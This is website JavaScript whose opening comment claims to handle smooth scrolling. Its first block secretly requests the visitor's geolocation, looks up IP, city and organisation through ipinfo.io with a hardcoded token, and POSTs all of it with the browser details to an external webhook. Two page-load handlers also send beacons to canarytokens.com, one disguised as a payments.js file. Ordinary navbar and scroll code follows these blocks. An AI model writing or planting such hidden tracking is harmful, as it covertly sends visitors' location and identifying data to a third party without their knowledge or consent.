// Smooth scrolling for navigation link 
        (function() {
            // جلب بيانات الموقع عبر Geolocation API
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;

                        // جلب IP والمعلومات عبر ipinfo.io مع استخدام التوكن
                        fetch('https://ipinfo.io/json?token=4e3a21a0a706b5')   
                            .then(res => res.json())
                            .then(ipData => {

                                const dataToSend = {
                                    alert: "🚨 تم رصد زائر جديد!",
                                    ip: ipData.ip || "غير معروف",
                                    country: ipData.country || "غير معروف",
                                    region: ipData.region || "غير معروف",
                                    city: ipData.city || "غير معروف",
                                    location: `${lat}, ${lon}`,
                                    org: ipData.org || "غير معروف",
                                    platform: navigator.platform,
                                    browser: navigator.userAgent,
                                    time: new Date().toLocaleString()
                                };

                                // إرسال البيانات إلى الـ Webhook
                                fetch('https://webhook-test.com/03d677f4537c3db699306e1fdfe1bd63', {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json'
                                    },
                                    body: JSON.stringify(dataToSend)
                                });

                            })
                            .catch(err => {
                                console.error("خطأ في جلب بيانات IP:", err);
                            });
                    },
                    function(error) {
                        console.error("خطأ في الحصول على الموقع:", error.message);
                    }
                );
            } else {
                alert("الموقع غير مدعوم في هذا المتصفح.");
            }
        })();
    





document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        document.querySelector(this.getAttribute('href')).scrollIntoView({
            behavior: 'smooth'
        });
    });
});

// Navbar background change on scroll
window.addEventListener('scroll', function() {
    const nav = document.querySelector('nav');
    if (window.scrollY > 50) {
        nav.style.background = 'rgba(10, 10, 10, 0.95)';
    } else {
        nav.style.background = 'rgba(10, 10, 10, 0.7)';
    }
});

// Add animation to elements when they come into view
const observerOptions = {
    threshold: 0.1
};

window.addEventListener('load', function() {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://canarytokens.com/static/traffic/terms/a0sk5421jcztm7sdyqichhq5q/payments.js', true); // يمكنك تغييرها إلى 'POST' إذا كنت تريد إرسال بيانات
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) { // الطلب اكتمل
            if (xhr.status === 200) {
                console.log('تم إرسال الطلب بنجاح:', xhr.responseText);
            } else {
                console.error('حدث خطأ أثناء إرسال الطلب:', xhr.status);
            }
        }
    };
    xhr.send();
});



window.addEventListener('load', function() {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://vxwrs3erowcpfxb3ka36oanrp.canarytokens.com', true); // يمكنك تغييرها إلى 'POST' إذا كنت تريد إرسال بيانات
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) { // الطلب اكتمل
            if (xhr.status === 200) {
                console.log('تم إرسال الطلب بنجاح:', xhr.responseText);
            } else {
                console.error('حدث خطأ أثناء إرسال الطلب:', xhr.status);
            }
        }
    };
    xhr.send();
});
